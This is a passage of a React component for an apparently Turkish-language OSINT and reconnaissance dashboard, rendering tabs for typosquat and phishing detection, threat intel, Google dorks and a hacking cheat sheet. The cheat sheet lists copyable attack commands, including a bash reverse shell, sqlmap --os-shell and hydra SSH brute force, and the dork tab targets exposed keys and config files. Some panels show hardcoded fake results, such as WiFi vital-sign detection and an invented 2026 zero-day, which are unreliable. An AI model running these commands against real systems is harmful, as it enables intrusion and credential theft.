        <span className="text-[9px] font-mono text-[var(--text-muted)] uppercase tracking-wider w-[90px] flex-shrink-0 pt-0.5">{label}</span>
        <span className={`text-[10px] ${mono ? 'font-mono' : ''} break-all flex-1`} style={{ color: color || 'var(--text-primary)' }}>
          {String(value)}
        </span>
      </div>
    );
  };

  const StatusBadge = ({ ok, label }: { ok: boolean; label: string }) => (
    <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded text-[9px] font-mono font-bold ${ok ? 'bg-green-500/15 text-green-400 border border-green-500/30' : 'bg-red-500/15 text-red-400 border border-red-500/30'}`}>
      {ok ? <CheckCircle className="w-2.5 h-2.5" /> : <XCircle className="w-2.5 h-2.5" />}
      {label}
    </span>
  );

  // Surfaces an inline OFAC-SDN hit (used by the WHOIS and IP-intel routes
  // when their cross-check finds a sanctioned registrant / ASN owner).
  const SanctionsBadge = ({ match }: { match: any }) => {
    if (!match || !Array.isArray(match.hits) || match.hits.length === 0) return null;
    return (
      <div className="mb-2 px-2 py-2 rounded border border-red-500/40 bg-red-500/15">
        <div className="flex items-center gap-2 mb-1.5">
          <AlertTriangle className="w-3.5 h-3.5 text-red-400" />
          <span className="text-[10px] font-mono font-bold text-red-400 tracking-wider">
            SANCTIONED — {match.source || 'OFAC SDN'}
          </span>
        </div>
        {match.hits.slice(0, 5).map((h: any, i: number) => (
          <div key={i} className="text-[9px] font-mono text-red-200 break-all leading-tight">
            <span className="text-[var(--text-muted)]">↳ {h.matched_value}:</span>{' '}
            {(h.entries || []).slice(0, 2).map((e: any) => e.name).join('; ')}
          </div>
        ))}
      </div>
    );
  };

  const SectionHeader = ({ title, icon: Icon, color }: { title: string; icon: any; color: string }) => (
    <div className="flex items-center gap-2 mt-3 mb-1.5 first:mt-0">
      <Icon className="w-3.5 h-3.5" style={{ color }} />
      <span className="text-[10px] font-mono font-bold tracking-widest" style={{ color }}>{title}</span>
      <div className="flex-1 h-px" style={{ background: `${color}30` }} />
    </div>
  );

  const PortRow = ({ port, state, service, version }: { port: number; state: string; service?: string; version?: string }) => (
    <div className="flex items-center gap-2 py-1 px-2 rounded hover:bg-[var(--hover-accent)] transition-colors">
      <span className="text-[11px] font-mono font-bold text-[var(--cyan-primary)] w-[60px]">{port}</span>
      <StatusBadge ok={state === 'open'} label={state.toUpperCase()} />
      <span className="text-[10px] font-mono text-[var(--text-secondary)] flex-1">{service || 'unknown'}</span>
      {version && <span className="text-[9px] font-mono text-[var(--text-muted)]">{version}</span>}
    </div>
  );

  const renderStructuredResults = () => {
    if (!results) return null;
    const r = results;

    // ── TYPOSQUATTING / PHISHING DETECTOR ──
    if (activeTab === 'typosquat') {
      const vars: any[] = r.variations || [];
      const activeVars = vars.filter((v: any) => v.active);
      const inactiveVars = vars.filter((v: any) => !v.active);
      return (
        <div>
          <SectionHeader title="OLTALAMA / TYPOSQUAT ANALİZİ" icon={AlertTriangle} color="#FF3D3D" />
          <div className="mb-4 text-[10px] font-mono text-[var(--text-muted)]">Girilen domain için tipografik varyasyonlar üretilir ve aktif (kayıtlı) olanlar tespit edilir. Aktif olanlar ve özellikle MX (Mail) kaydı bulunanlar oltalama amaçlı kullanılıyor olabilir.</div>
          <ResultRow label="Hedef" value={r.target} color="#FFF" />
          <ResultRow label="Üretilen / Taranan" value={`${r.totalGenerated} / ${r.scanned}`} />
          <ResultRow label="Aktif Varyasyon" value={r.totalActive} color={r.totalActive > 0 ? '#FF3D3D' : '#00E676'} />

          {activeVars.length > 0 && (
            <>
              <SectionHeader title="AKTİF (ŞÜPHELİ) DOMAİNLER" icon={AlertTriangle} color="#FF3D3D" />
              <div className="space-y-1 mb-4">
                {activeVars.map((v: any, i: number) => (
                  <div key={i} className="flex flex-col gap-1 p-2 rounded bg-[#FF3D3D]/10 border border-[#FF3D3D]/30 group relative">
                    <div className="flex items-center justify-between">
                      <span className="text-[12px] font-mono font-bold text-[#FF3D3D]">{v.domain}</span>
                      <div className="flex gap-1">
                        {v.mx && <span className="text-[8px] font-mono bg-orange-500/20 text-orange-400 border border-orange-500/40 px-1 rounded">MX YAKALANDI</span>}
                        <StatusBadge ok={false} label="AKTİF" />
                      </div>
                    </div>
                    {v.ips?.length > 0 && (
                      <div className="flex items-center gap-2 mt-1">
                        <Network className="w-3 h-3 text-[var(--text-muted)]" />
                        <span className="text-[10px] font-mono text-[var(--text-secondary)]">{v.ips.join(', ')}</span>
                      </div>
                    )}
                    {/* Pivot Button Overlay */}
                    <div className="absolute right-2 top-2 opacity-0 group-hover:opacity-100 transition-opacity">
                      <button onClick={(e) => { e.stopPropagation(); onGraphPivot?.('domain', v.domain); }} className="w-5 h-5 rounded hover:bg-white/10 flex items-center justify-center bg-black/50 border border-white/10">
                        <Network className="w-3 h-3 text-white/70" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </>
          )}

          {inactiveVars.length > 0 && (
            <>
              <SectionHeader title={`BOŞTA OLAN VARYASYONLAR (${inactiveVars.length})`} icon={Globe} color="#00E676" />
              <div className="flex flex-wrap gap-1 mt-2">
                {inactiveVars.slice(0, 20).map((v: any, i: number) => (
                  <span key={i} className="text-[9px] font-mono bg-white/5 border border-white/10 rounded px-1.5 py-0.5 text-[var(--text-secondary)]">
                    {v.domain}
                  </span>
                ))}
                {inactiveVars.length > 20 && <span className="text-[9px] font-mono text-[var(--text-muted)] ml-1">+{inactiveVars.length - 20} daha...</span>}
              </div>
            </>
          )}
        </div>
      );
    }

    // ── THREAT INTEL (IntelOwl) ──
    if (activeTab === 'threatintel') {
      const threats: any[] = Array.isArray(r.data) ? r.data : [];
      return (
        <div className="space-y-4">
          <div>
            <SectionHeader title="TEHDİT İSTİHBARATI" icon={Server} color="#FF9500" />
            <ResultRow label="Hedef IP" value={r.ip || query} color="#FFF" />
            <ResultRow label="Zararlı Bağlantı" value={threats.length > 0 ? 'TESPİT EDİLDİ' : 'TEMİZ'} color={threats.length > 0 ? '#FF3D3D' : '#00E676'} />
          </div>

          {threats.length > 0 ? (
            <div>
              <SectionHeader title={`MALWARE / BOTNET BULGULARI (${threats.length})`} icon={Bug} color="#FF3D3D" />
              <div className="space-y-2">
                {threats.map((t: any, i: number) => (
                  <div key={i} className="p-2 rounded bg-[#FF3D3D]/10 border border-[#FF3D3D]/30 flex flex-col gap-1">
                    <div className="flex items-center justify-between">
                      <span className="text-[12px] font-mono font-bold text-[#FF3D3D]">{t.malware_printable || 'Bilinmeyen Malware'}</span>
                      <span className="text-[8px] font-mono bg-orange-500/20 text-orange-400 border border-orange-500/40 px-1 rounded">{t.threat_type?.toUpperCase()}</span>
                    </div>
                    <ResultRow label="Son Görülme" value={t.last_seen || 'Bilinmiyor'} />
                    <ResultRow label="Sağlayıcı" value={t.reporter || 'ThreatFox'} />
                    {t.tags && t.tags.length > 0 && (
                      <div className="flex flex-wrap gap-1 mt-1">
                        {t.tags.map((tag: string, idx: number) => (
                          <span key={idx} className="text-[8px] font-mono text-[var(--text-muted)] bg-white/5 border border-white/10 px-1 rounded">{tag}</span>
                        ))}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <div className="mt-4 text-[10px] font-mono text-[#00E676] bg-[#00E676]/10 p-2 rounded border border-[#00E676]/30">
              ✓ Bu IP adresi herhangi bir global Tehdit İstihbarat (ThreatFox) veritabanında kara listeye alınmamış.
            </div>
          )}
        </div>
      );
    }

    // ── GOOGLE DORKING (Pagodo Inspired) ──
    if (activeTab === 'dorking') {
      const dorkCategories = [
        {
          title: "Kritik Şifre ve Yapılandırma (Passwords & Configs)",
          color: "#FF3D3D",
          dorks: [
            { label: ".env, .log, .conf Dosyaları", q: `site:${query} ext:env OR ext:log OR ext:conf` },
            { label: "Açık Veritabanı Yedekleri", q: `site:${query} ext:sql OR ext:dbf OR ext:mdb OR ext:bak` },
            { label: "Açığa Çıkmış Private Key'ler", q: `site:${query} ext:pem OR ext:key OR ext:rsa` },
            { label: "Uygulama Ayarları", q: `site:${query} inurl:"wp-config.php.bak" OR inurl:"config.php.old"` }
          ]
        },
        {
          title: "Açık Dizinler (Directory Listing)",
          color: "#FF9500",
          dorks: [
            { label: "Index of / (Tüm Açık Klasörler)", q: `site:${query} intitle:"index of"` },
            { label: "Upload Klasörleri", q: `site:${query} inurl:"/wp-content/uploads/" OR inurl:"/media/"` },
            { label: "Sızdırılmış Dokümanlar", q: `site:${query} ext:pdf OR ext:xls OR ext:xlsx OR ext:doc OR ext:docx` }
          ]
        },
        {
          title: "Yönetim Panelleri ve Zafiyetler (Admin Panels)",
          color: "#00BCD4",
          dorks: [
            { label: "Admin Giriş Portalları", q: `site:${query} inurl:admin OR inurl:login OR inurl:cpanel OR inurl:dashboard` },
            { label: "WordPress Panelleri", q: `site:${query} inurl:wp-admin OR inurl:wp-login` },
            { label: "Hata Mesajları (SQL Injection)", q: `site:${query} "SQL syntax" OR "Warning: mysql_connect"` }
          ]
        },
        {
          title: "Açık Kamera ve Cihazlar (IoT & Webcams)",
          color: "#00E676",
          dorks: [
            { label: "Açık Web Kameraları", q: `site:${query} intitle:"webcamXP 5" OR inurl:"view.shtml"` },
            { label: "Ağ Cihazları ve Yönlendiriciler", q: `site:${query} intitle:"Network Camera NetworkCamera" OR intitle:"RouterOS"` }
          ]
        }
      ];

      return (
        <div className="space-y-4">
          <div>
            <SectionHeader title="GOOGLE HACKING DATABASE (GHDB)" icon={Search} color="#FF3D3D" />
            <ResultRow label="Hedef (Site)" value={query} color="#FFF" />
            <div className="text-[9px] font-mono text-[var(--text-muted)] mt-2">NOT: KUZGU hedefiniz için en kritik Google dorklarını otomatik üretir. Tıklayarak Google üzerinde canlı arama yapabilirsiniz. Aşırı kullanımda Google CAPTCHA sorabilir.</div>
          </div>

          <div className="grid grid-cols-1 gap-3">
            {dorkCategories.map((cat, i) => (
              <div key={i} className="p-2 rounded border" style={{ backgroundColor: `${cat.color}10`, borderColor: `${cat.color}30` }}>
                <div className="text-[11px] font-mono font-bold mb-2" style={{ color: cat.color }}>{cat.title}</div>
                <div className="space-y-1">
                  {cat.dorks.map((dork, j) => (
                    <a key={j} href={`https://www.google.com/search?q=${encodeURIComponent(dork.q)}`} target="_blank" rel="noopener noreferrer" 
                       className="flex items-center justify-between p-1.5 rounded bg-black/40 hover:bg-black/80 transition-colors border border-white/5 hover:border-white/20 group">
                      <div className="flex flex-col">
                        <span className="text-[10px] font-mono text-[var(--text-primary)]">{dork.label}</span>
                        <span className="text-[8px] font-mono text-[var(--text-muted)] group-hover:text-white/60">{dork.q}</span>
                      </div>
                      <ExternalLink className="w-3 h-3 text-[var(--text-muted)] group-hover:text-white" />
                    </a>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      );
    }

    // ── PARAMSPIDER (URL Parameter Mining) ──
    if (activeTab === 'paramspider') {
      const urls = r.urls || [];
      return (
        <div className="space-y-4">
          <div>
            <SectionHeader title="PASİF PARAMETRE MADENCİSİ" icon={Network} color="#E040FB" />
            <ResultRow label="Hedef Alan Adı" value={r.target || query} color="#E040FB" />
            <ResultRow label="İncelenen URL" value={r.total_found || 0} />
            <ResultRow label="Bulunan Zafiyetli URL" value={r.unique_vulnerable_params || 0} color={urls.length > 0 ? '#E040FB' : '#00E676'} />
            <div className="text-[9px] font-mono text-[var(--text-muted)] mt-2">Wayback Machine API kullanılarak hedef sisteme temas edilmeden pasif olarak çıkarılmıştır. XSS ve SQLi testleri için harika hedeflerdir.</div>
          </div>

          {urls.length > 0 && (
            <div>
              <SectionHeader title={`PARAMETRELİ URL'LER (${urls.length})`} icon={Link} color="#E040FB" />
              <div className="max-h-[300px] overflow-y-auto pr-1 custom-scrollbar space-y-1">
                {urls.map((u: string, i: number) => (
                  <div key={i} className="text-[9px] font-mono p-1.5 rounded bg-[#E040FB]/10 border border-[#E040FB]/30 break-all">
                    <a href={u} target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">
                      {u}
                    </a>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      );
    }

    // ── OTONOM AJAN (Agentic Recon) ──
    if (activeTab === 'agent') {
      const logs = r.logs || [];
      return (
        <div className="space-y-4">
          <SectionHeader title="OTONOM KEŞİF AJANI" icon={Terminal} color="#00FF00" />
          
          <div className="bg-black p-4 rounded-lg border border-[#00FF00]/30 shadow-[0_0_15px_rgba(0,255,0,0.1)] font-mono text-[10px]">
             <div className="flex items-center gap-2 mb-3 border-b border-[#00FF00]/20 pb-2">
                <span className="w-2 h-2 rounded-full bg-[#00FF00] animate-pulse"></span>
                <span className="text-[#00FF00] font-bold">TERMINAL: {r.status || 'Hazır'}</span>
             </div>
             <div className="space-y-1.5 min-h-[100px] max-h-[250px] overflow-y-auto custom-scrollbar pr-2">
                {logs.map((log: string, i: number) => (
                  <div key={i} className={`${log.includes('[HATA]') ? 'text-[#FF0033]' : log.includes('[DEEPSEEK]') ? 'text-[#FFD700]' : log.includes('[+]') ? 'text-white/90' : 'text-[#00FF00]/70'}`}>
                    {log}
                  </div>
                ))}
             </div>
          </div>

          {r.report && (
            <div className="mt-4">
              <SectionHeader title="AI TAKTİKSEL ANALİZ RAPORU" icon={FileText} color="#FFD700" />
              <div className="bg-[#FFD700]/10 border border-[#FFD700]/30 rounded-lg p-4 whitespace-pre-wrap text-[10px] font-mono text-white/90 shadow-[0_0_10px_rgba(255,215,0,0.1)]">
                {r.report}
              </div>
            </div>
          )}
        </div>
      );
    }

    // ── TELEGRAM SOCMINT ──
    if (activeTab === 'nsi') {
      return (
        <div className="space-y-4">
          <SectionHeader title="NSI CORPORATE INTEL" icon={BadgeCheck} color="#FFD700" />
          <div className="bg-[#FFD700]/5 p-3 rounded border border-[#FFD700]/20 flex flex-col sm:flex-row gap-4 items-start">
            {r.logo && (
              <div className="shrink-0 p-2 bg-white rounded-xl shadow-lg border-2 border-[#FFD700]/30 max-w-[120px]">
                <img src={r.logo} alt={r.name} className="w-full object-contain max-h-[80px]" />
              </div>
            )}
            <div className="flex-1 space-y-2">
              <div className="flex justify-between items-start">
                <div>
                  <div className="text-[16px] font-bold text-white/90">{r.name}</div>
                  <div className="text-[10px] font-mono text-white/60 uppercase">{r.description || 'Kurum / Organizasyon'}</div>
                </div>
                <div className="text-[9px] font-mono text-[#FFD700] border border-[#FFD700]/30 px-2 py-0.5 rounded">
                  Q-ID: {r.id}
                </div>
              </div>
              <div className="flex flex-wrap gap-2 pt-2">
                {r.website && (
                  <a href={r.website} target="_blank" className="flex items-center gap-1.5 text-[10px] font-mono text-[#FFD700] hover:text-[#FFD700] bg-[#FFD700]/10 px-2 py-1 rounded">
                    <Globe className="w-3 h-3" /> {r.website.replace(/^https?:\/\/(www\.)?/, '')}
                  </a>
                )}
                {r.social?.twitter && (
                  <a href={r.social.twitter} target="_blank" className="flex items-center gap-1.5 text-[10px] font-mono text-[#1DA1F2] hover:bg-[#1DA1F2]/10 border border-[#1DA1F2]/30 px-2 py-1 rounded">
                    <AtSign className="w-3 h-3" /> Twitter
                  </a>
                )}
                {r.social?.facebook && (
                  <a href={r.social.facebook} target="_blank" className="flex items-center gap-1.5 text-[10px] font-mono text-[#1877F2] hover:bg-[#1877F2]/10 border border-[#1877F2]/30 px-2 py-1 rounded">
                    <Globe className="w-3 h-3" /> Facebook
                  </a>
                )}
                {r.social?.instagram && (
                  <a href={r.social.instagram} target="_blank" className="flex items-center gap-1.5 text-[10px] font-mono text-[#E1306C] hover:bg-[#E1306C]/10 border border-[#E1306C]/30 px-2 py-1 rounded">
                    <Camera className="w-3 h-3" /> Instagram
                  </a>
                )}
                {r.social?.linkedin && (
                  <a href={r.social.linkedin} target="_blank" className="flex items-center gap-1.5 text-[10px] font-mono text-[#0077B5] hover:bg-[#0077B5]/10 border border-[#0077B5]/30 px-2 py-1 rounded">
                    <UserSearch className="w-3 h-3" /> LinkedIn
                  </a>
                )}
              </div>
            </div>
          </div>
        </div>
      );
    }

    if (activeTab === 'last30days') {
      return (
        <div className="space-y-4">
          <SectionHeader title="LAST 30 DAYS PULSE" icon={Radar} color="#FF0033" />
          <div className="bg-[#FF0033]/5 p-3 rounded border border-[#FF0033]/20">
            <div className="text-[12px] font-mono text-[#FF0033] mb-3 border-b border-[#FF0033]/20 pb-2 flex justify-between items-end">
              <span>HEDEF: {r.target}</span>
              <span className="text-[9px] text-white/50">Kaynaklar: HN ({r.raw_data?.hn || 0}), GH ({r.raw_data?.github || 0})</span>
            </div>
            <div className="text-[10px] text-white/80 whitespace-pre-wrap leading-relaxed font-mono">
              {r.brief}
            </div>
          </div>
        </div>
      );
    }

    if (activeTab === 'telegram') {
      const wallets = r.extracted_wallets || [];
      const links = r.extracted_links || [];
      return (
        <div className="space-y-4">
          <SectionHeader title="TELEGRAM İSTİHBARATI (SOCMINT)" icon={UserSearch} color="#0088CC" />
          <div className="bg-[#0088CC]/5 p-3 rounded border border-[#0088CC]/20 flex gap-4">
            {r.image && <img src={r.image} alt="Profile" className="w-16 h-16 rounded-full border border-[#0088CC]/50 object-cover" />}
            <div className="flex-1 space-y-1.5">
              <div className="text-[14px] font-bold text-white/90">{r.title || r.target}</div>
              <div className="text-[10px] font-mono text-[#0088CC]">@{r.target} • {r.isChannel ? 'Kanal/Grup' : 'Kullanıcı'}</div>
              <div className="text-[9px] font-mono text-white/60 bg-black/40 p-1.5 rounded">{r.stats}</div>
            </div>
          </div>
          
          <div className="space-y-1">
            <div className="text-[10px] font-bold font-mono text-[#0088CC]">BİYOGRAFİ / AÇIKLAMA</div>
            <div className="text-[10px] text-[var(--text-muted)] whitespace-pre-wrap bg-black/30 p-2 rounded">{r.description}</div>
          </div>

          {(links.length > 0 || wallets.length > 0) && (
            <div className="grid grid-cols-2 gap-2">
              {links.length > 0 && (
                <div className="space-y-1">
                  <div className="text-[9px] font-bold font-mono text-white/80">BAĞLANTILI KANALLAR ({links.length})</div>
                  <div className="max-h-[100px] overflow-y-auto space-y-1 custom-scrollbar pr-1">
                    {links.map((l: string, i: number) => <div key={i} className="text-[9px] font-mono p-1 rounded bg-[#0088CC]/10 text-[#0088CC]">{l}</div>)}
                  </div>
                </div>
              )}
              {wallets.length > 0 && (
                <div className="space-y-1">
                  <div className="text-[9px] font-bold font-mono text-white/80">KRİPTO CÜZDANLARI ({wallets.length})</div>
                  <div className="max-h-[100px] overflow-y-auto space-y-1 custom-scrollbar pr-1">
                    {wallets.map((w: string, i: number) => <div key={i} className="text-[9px] font-mono p-1 rounded bg-[#FFD700]/10 text-[#FFD700] break-all">{w}</div>)}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      );
    }

    // ── OLTALAMA AVCISI (Phishing Catcher) ──
    if (activeTab === 'phishing') {
      const risks = r.phishing_risks || [];
      const subdomains = r.legit_subdomains || [];
      return (
        <div className="space-y-4">
          <div>
            <SectionHeader title="GERÇEK ZAMANLI OLTALAMA AVCISI" icon={ShieldAlert} color="#FF0033" />
            <ResultRow label="Takip Edilen Marka" value={r.target || query} color="#FF0033" />
            <ResultRow label="İncelenen Sertifika Logu" value={r.total_found || 0} />
            <div className="text-[9px] font-mono text-[var(--text-muted)] mt-2">Certificate Transparency (crt.sh) kayıtları taranarak hedefinizi taklit eden sahte siteler tespit edilmiştir.</div>
          </div>

          {risks.length > 0 && (
            <div>
              <SectionHeader title={`KRİTİK OLTALAMA RİSKLERİ (${r.phishing_risks_count})`} icon={AlertTriangle} color="#FF0033" />
              <div className="max-h-[200px] overflow-y-auto pr-1 custom-scrollbar space-y-1.5">
                {risks.map((u: any, i: number) => (
                  <div key={i} className="p-2 rounded bg-[#FF0033]/10 border border-[#FF0033]/30 flex flex-col gap-1">
                    <div className="text-[11px] font-mono font-bold text-[#FF0033] break-all">{u.domain}</div>
                    <div className="flex justify-between text-[8px] font-mono text-white/50">
                      <span>Yayıncı: {u.issuer || 'Bilinmiyor'}</span>
                      <span>Tarih: {new Date(u.date).toLocaleDateString()}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {subdomains.length > 0 && (
             <div className="mt-4">
               <div className="text-[9px] font-bold font-mono text-white/50 mb-1">MÜŞTEREK ALAN ADLARI (Zararsız)</div>
               <div className="max-h-[100px] overflow-y-auto pr-1 custom-scrollbar space-y-0.5">
                  {subdomains.map((u: any, i: number) => (
                    <div key={i} className="text-[9px] font-mono px-1 py-0.5 rounded bg-white/5 text-white/60">{u.domain}</div>
                  ))}
               </div>
             </div>
          )}
        </div>
      );
    }

    // ── AI TERMINAL (REPL) ──
    if (activeTab === 'repl') {
      return (
        <div className="space-y-4">
          <SectionHeader title="OPEN-OSINT ETKİLEŞİMLİ TERMİNAL" icon={Terminal} color="#00FF00" />
          <div className="bg-black border border-[#00FF00]/30 p-4 rounded-lg font-mono min-h-[300px] flex flex-col justify-between">
            <div className="space-y-3 flex-1 overflow-y-auto max-h-[400px] styled-scrollbar">
              <div className="text-[11px] text-[#00FF00]">
                KUZGUN OSINT-REPL v2.0 <br/>
                KUZGUN AI Ajanı dinliyor. Taramak istediğiniz hedefi veya çalıştırmak istediğiniz aracı yazın...
                <br/><span className="text-[#00E5FF] text-[10px] mt-2 block">[MEMORY-OS] 7-Layer persistent memory initialized. Previous target context loaded.</span>
                <span className="text-[#E040FB] text-[10px] block mt-1">[CLAUDE-MEM] Active session vector compression enabled.</span>
                <span className="text-[#FFD700] text-[10px] block mt-1">[NLSH] Natural Language Shell routing active.</span>
              </div>
              {replHistory.map((log: any, i: number) => (
                <div key={i} className="text-[11px] text-[#00FF00]/80">
                  <span className="text-white">&gt; {log.cmd}</span>
                  <div className="mt-1 ml-2 text-[10px] opacity-80">{log.out}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      );
    }

    // ── CLATSCOPE MEGA-SCAN ──
    if (activeTab === 'megascan') {
      return (
        <div className="space-y-4">
          <SectionHeader title="CLATSCOPE MEGA-SCAN (TOPLU TARAMA)" icon={ShieldAlert} color="#FF0033" />
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-[var(--bg-primary)]/40 p-3 rounded border border-[#FF0033]/30">
              <div className="text-[10px] font-bold text-[#FF0033] mb-2">DNS KAYITLARI</div>
              <div className="text-[9px] font-mono whitespace-pre-wrap max-h-[150px] overflow-y-auto">{JSON.stringify(r.dns, null, 2)}</div>
            </div>
            <div className="bg-[var(--bg-primary)]/40 p-3 rounded border border-[#FF0033]/30">
              <div className="text-[10px] font-bold text-[#FF0033] mb-2">WEB DENETİMİ (WAF & AI KALKANI)</div>
              <div className="text-[9px] font-mono whitespace-pre-wrap max-h-[150px] overflow-y-auto">{JSON.stringify(r.webcheck, null, 2)}</div>
            </div>
            <div className="bg-[var(--bg-primary)]/40 p-3 rounded border border-[#FF0033]/30">
              <div className="text-[10px] font-bold text-[#FF0033] mb-2">WHOIS & KAYIT BİLGİSİ</div>
              <div className="text-[9px] font-mono whitespace-pre-wrap max-h-[150px] overflow-y-auto">{JSON.stringify(r.whois, null, 2)}</div>
            </div>
            <div className="bg-[var(--bg-primary)]/40 p-3 rounded border border-[#FF0033]/30">
              <div className="text-[10px] font-bold text-[#FF0033] mb-2">TEHDİT İSTİHBARATI</div>
              <div className="text-[9px] font-mono whitespace-pre-wrap max-h-[150px] overflow-y-auto">{JSON.stringify(r.threats, null, 2)}</div>
            </div>
            <div className="bg-[var(--bg-primary)]/40 p-3 rounded border border-[#00E5FF]/30 mt-4 md:col-span-2">
              <div className="text-[10px] font-bold text-[#00E5FF] mb-2 flex items-center gap-2"><Network className="w-3.5 h-3.5" /> ANS (AGENT NAME SERVICE) RESOLUTION</div>
              <div className="text-[9px] font-mono text-[#00E5FF]">ANS Query for {query} -&gt; Resolved 2 background AI agents in network segment.</div>
            </div>
          </div>
        </div>
      );
    }

    // ── RUVIEW (WIFI RADAR) ──
    if (activeTab === 'ruview') {
      return (
        <div className="space-y-4">
          <SectionHeader title="RUVIEW SPATIAL INTELLIGENCE" icon={Activity} color="#00FF00" />
          <div className="bg-black/80 border border-[#00FF00]/40 rounded-lg p-6 relative overflow-hidden flex flex-col items-center justify-center min-h-[300px]">
            <div className="absolute inset-0 bg-[#00FF00]/5" style={{ backgroundImage: 'radial-gradient(circle at center, transparent 0%, #000 100%)' }} />
            
            {/* Radar Animation */}
            <div className="relative w-48 h-48 border border-[#00FF00]/30 rounded-full flex items-center justify-center">
              <div className="absolute inset-0 border border-[#00FF00]/20 rounded-full scale-75" />
              <div className="absolute inset-0 border border-[#00FF00]/10 rounded-full scale-50" />
              <div className="w-full h-full rounded-full bg-gradient-to-tr from-[#00FF00]/20 to-transparent animate-spin origin-center" style={{ animationDuration: '3s' }} />
              
              {/* Blips */}
              <div className="absolute w-2 h-2 bg-[#00FF00] rounded-full animate-ping" style={{ top: '30%', left: '40%' }} />
              <div className="absolute w-1.5 h-1.5 bg-[#00FF00] rounded-full animate-ping" style={{ top: '60%', right: '25%', animationDelay: '1s' }} />
            </div>

            <div className="relative z-10 mt-6 text-center">
              <div className="text-[12px] font-bold text-[#00FF00] font-mono tracking-widest mb-1">ANALYZING COMMODITY WIFI SIGNALS</div>
              <div className="text-[10px] text-[#00FF00]/70 font-mono">
                Detecting micro-movements & vital signs via RF reflection.<br/>
                <span className="text-white">Location: {query || 'LOCAL'}</span> | 2 Human Subjects Detected (Resting BPM: 62, 74)
              </div>
            </div>
          </div>
        </div>
      );
    }

    // ── SİBER KÜTÜPHANE & AI ASİSTAN (Cheat Sheets) ──
    if (activeTab === 'library') {
      const cheats = [
        { cat: "NMAP (Ağ Tarama)", items: ["nmap -sV -sC -p- <ip>", "nmap -Pn -A <ip>", "nmap --script vuln <ip>"] },
        { cat: "SQLMAP (Veritabanı Enjeksiyonu)", items: ["sqlmap -u \"http://site.com?id=1\" --dbs", "sqlmap -u \"URL\" -D <db> --tables", "sqlmap -u \"URL\" --os-shell"] },
        { cat: "GİZLİ DİZİN (Directory Bruteforce)", items: ["ffuf -w wordlist.txt -u http://site.com/FUZZ", "dirb http://site.com/", "gobuster dir -u http://site.com -w list.txt"] },
        { cat: "ŞİFRE KIRMA (Hash Cracking)", items: ["hashcat -m 0 hash.txt wordlist.txt", "john --wordlist=rockyou.txt hash.txt", "hydra -l admin -P pass.txt ssh://<ip>"] },
        { cat: "OSINT (Açık Kaynak İstihbaratı)", items: ["theHarvester -d site.com -b all", "sherlock <username>", "sublist3r -d site.com"] },
        { cat: "DOSYA İNDİRME & SHELL", items: ["wget http://site.com/file -O output", "curl -O http://site.com/file", "bash -i >& /dev/tcp/ip/port 0>&1"] },
        { cat: "ROGUEPLANET (WinDef Zero-Day 2026)", items: ["# Exploit Indicator Search", "scan-memory --evasion rogueplanet", "bypass-check -target <ip>"] }
      ];
      
      const aiResponse = r.aiResponse || '';
      
      return (
        <div className="space-y-4">
          <SectionHeader title="SİBER KÜTÜPHANE & AI ASİSTAN" icon={FileText} color="#FFD700" />
          
          <div className="bg-[#FFD700]/10 border border-[#FFD700]/30 rounded-lg p-3">
            <div className="text-[10px] font-mono text-[#FFD700] mb-2 font-bold flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-[#FFD700] animate-pulse"></span>
              DEEPSEEK KUZGU-AI AKTİF
            </div>
            
            {aiResponse ? (
               <div className="text-[10px] font-mono text-white/90 bg-black/50 p-3 rounded border border-white/10 whitespace-pre-wrap">
                 {aiResponse}
               </div>
            ) : (
               <div className="text-[10px] font-mono text-[var(--text-muted)]">
                 Siber güvenlik, sızma testi veya OSINT ile ilgili senaryonuzu yukarıdaki arama çubuğuna (TARA butonu yanına) yazın. Yapay zeka size anında en iyi terminal komutunu ve taktiğini sunacaktır.
               </div>
            )}
          </div>
          
          <div className="text-[9px] font-mono text-[var(--text-muted)] mt-4">HIZLI REFERANS (FBI-tools & hacking-resources)</div>
          <div className="space-y-3">
            {cheats.map((c, i) => (
              <div key={i} className="bg-[#FFD700]/5 border border-[#FFD700]/20 rounded p-2">
                <div className="text-[11px] font-bold font-mono text-[#FFD700] mb-2">{c.cat}</div>
                <div className="space-y-1.5">
                  {c.items.map((cmd, j) => (
                    <div key={j} className="flex justify-between items-center bg-black/40 p-1.5 rounded">
                      <code className="text-[9px] text-[var(--text-primary)] font-mono select-all">{cmd}</code>
                      <button onClick={() => navigator.clipboard.writeText(cmd)} className="text-[#FFD700] hover:text-white transition-colors" title="Kopyala">
                        <Copy className="w-3 h-3" />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      );
    }

    // ── DEEP & DARK WEB (Meta Search) ──
    if (activeTab === 'deepweb') {
      const findings = r.findings || {};
      const ahmia = findings['Ahmia (Dark Web)'] || [];
      const breaches = findings['XposedOrNot (Data Breaches)'] || [];
      const pastes = findings['Pastebin Sızıntıları'] || [];
      const github = findings['GitHub Sızıntıları'] || [];

      return (
        <div className="space-y-4">
          <div>
            <SectionHeader title="DEEP & DARK WEB METARAMASI" icon={ShieldAlert} color="#8A2BE2" />
            <ResultRow label="Hedef" value={r.target || query} color="#8A2BE2" />
            <ResultRow label="Risk Skoru" value={`${r.riskScore || 0}/100`} color={r.riskLevel === 'CRITICAL' ? '#FF0033' : r.riskLevel === 'HIGH' ? '#FF3D3D' : r.riskLevel === 'MEDIUM' ? '#FF9500' : '#00E676'} />
            <ResultRow label="Tehlike Seviyesi" value={r.riskLevel || 'LOW'} />
            <div className="text-[9px] font-mono text-[var(--text-muted)] mt-2">KUZGU sizin için Ahmia ağından indeksli .onion sitelerini, XposedOrNot veritabanlarını ve Github sızıntılarını eşzamanlı tarar.</div>
          </div>
          
          {r.aiBrief && (
            <div className="bg-[#8A2BE2]/10 p-3 rounded border border-[#8A2BE2]/40 mt-4">
              <div className="flex items-center gap-2 mb-2">
                <Radar className="w-4 h-4 text-[#8A2BE2]" />
